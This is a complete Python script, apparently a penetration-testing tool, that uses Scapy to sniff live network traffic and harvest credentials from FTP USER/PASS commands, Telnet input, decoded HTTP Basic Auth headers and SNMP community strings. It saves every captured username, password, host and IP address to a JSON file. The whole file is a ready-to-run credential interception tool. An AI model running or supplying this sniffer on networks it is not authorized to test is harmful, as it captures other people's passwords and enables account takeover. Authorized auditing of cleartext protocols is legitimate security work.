#!/usr/bin/env python3
"""
Cleartext Protocol Sniffer
Captures credentials from cleartext protocols (FTP, Telnet, HTTP Basic Auth, SNMP)
"""

import sys
import json
import re
from scapy.all import sniff, TCP, UDP, Raw
from scapy.layers.http import HTTPRequest
from base64 import b64decode

class CleartextSniffer:
    def __init__(self, output_file):
        self.output_file = output_file
        self.findings = []
    
    def process_ftp(self, packet):
        """Extract FTP credentials"""
        try:
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # FTP USER command
                if load.startswith('USER '):
                    username = load.split('USER ')[1].strip()
                    self.findings.append({
                        "protocol": "FTP",
                        "type": "username",
                        "value": username,
                        "src_ip": packet[0][1].src,
                        "dst_ip": packet[0][1].dst,
                        "severity": "HIGH"
                    })
                
                # FTP PASS command
                elif load.startswith('PASS '):
                    password = load.split('PASS ')[1].strip()
                    self.findings.append({
                        "protocol": "FTP",
                        "type": "password",
                        "value": password,
                        "src_ip": packet[0][1].src,
                        "dst_ip": packet[0][1].dst,
                        "severity": "CRITICAL"
                    })
        except Exception as e:
            pass
    
    def process_http(self, packet):
        """Extract HTTP Basic Auth credentials"""
        try:
            if packet.haslayer(HTTPRequest):
                http_layer = packet[HTTPRequest]
                
                # Check for Authorization header
                if http_layer.Authorization:
                    auth = http_layer.Authorization.decode('utf-8', errors='ignore')
                    
                    if auth.startswith('Basic '):
                        # Decode Base64 credentials
                        encoded = auth.split('Basic ')[1]
                        try:
                            decoded = b64decode(encoded).decode('utf-8')
                            username, password = decoded.split(':', 1)
                            
                            self.findings.append({
                                "protocol": "HTTP Basic Auth",
                                "username": username,
                                "password": password,
                                "url": http_layer.Host.decode() + http_layer.Path.decode(),
                                "src_ip": packet[0][1].src,
                                "dst_ip": packet[0][1].dst,
                                "severity": "CRITICAL"
                            })
                        except:
                            pass
        except Exception:
            pass
    
    def process_telnet(self, packet):
        """Extract Telnet credentials (heuristic)"""
        try:
            if packet.haslayer(Raw):
                load = packet[Raw].load
                
                # Look for common login prompts
                text = load.decode('utf-8', errors='ignore')
                
                # Simple heuristic: capture data sent to telnet port
                if packet.haslayer(TCP) and packet[TCP].dport == 23:
                    # Filter out control characters
                    clean_text = ''.join(c for c in text if c.isprintable())
                    
                    if len(clean_text) > 3:
                        self.findings.append({
                            "protocol": "Telnet",
                            "type": "potential_credential",
                            "value": clean_text[:50],  # Limit length
                            "src_ip": packet[0][1].src,
                            "dst_ip": packet[0][1].dst,
                            "severity": "HIGH"
                        })
        except Exception:
            pass
    
    def process_snmp(self, packet):
        """Extract SNMP community strings"""
        try:
            if packet.haslayer(UDP) and packet[UDP].dport == 161:
                if packet.haslayer(Raw):
                    load = packet[Raw].load
                    
                    # SNMP community strings are often visible in cleartext
                    # This is a simplified detection
                    text = load.decode('utf-8', errors='ignore')
                    
                    # Look for common community strings
                    communities = ['public', 'private', 'community']
                    for comm in communities:
                        if comm in text.lower():
                            self.findings.append({
                                "protocol": "SNMP",
                                "type": "community_string",
                                "value": comm,
                                "src_ip": packet[0][1].src,
                                "dst_ip": packet[0][1].dst,
                                "severity": "HIGH"
                            })
                            break
        except Exception:
            pass
    
    def packet_handler(self, packet):
        """Main packet handler"""
        try:
            # Process FTP
            if packet.haslayer(TCP):
                if packet[TCP].dport == 21 or packet[TCP].sport == 21:
                    self.process_ftp(packet)
                
                # Process Telnet
                elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
                    self.process_telnet(packet)
                
                # Process HTTP
                elif packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    self.process_http(packet)
            
            # Process SNMP
            elif packet.haslayer(UDP):
                if packet[UDP].dport == 161 or packet[UDP].sport == 161:
                    self.process_snmp(packet)
        
        except Exception as e:
            pass
    
    def start_sniffing(self, duration=60, interface="eth0"):
        """Start packet sniffing"""
        print(f"[*] Starting cleartext credential sniffing for {duration} seconds...")
        print(f"[*] Monitoring protocols: FTP, Telnet, HTTP Basic Auth, SNMP")
        
        try:
            # Sniff packets
            sniff(
                prn=self.packet_handler,
                filter="tcp port 21 or tcp port 23 or tcp port 80 or udp port 161",
                timeout=duration,
                iface=interface,
                store=False
            )
        except Exception as e:
            print(f"[!] Error during sniffing: {e}")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save findings to JSON file"""
        output_data = {
            "total_findings": len(self.findings),
            "findings": self.findings
        }
        
        with open(self.output_file, 'w') as f:
            json.dump(output_data, f, indent=2)
        
        print(f"\n[+] Sniffing complete. Found {len(self.findings)} potential credentials.")
        print(f"[+] Results saved to {self.output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage: cleartext_sniffer.py <output_file> [duration] [interface]")
        sys.exit(1)
    
    output_file = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    interface = sys.argv[3] if len(sys.argv) > 3 else "eth0"
    
    sniffer = CleartextSniffer(output_file)
    sniffer.start_sniffing(duration=duration, interface=interface)

if __name__ == "__main__":
    main()
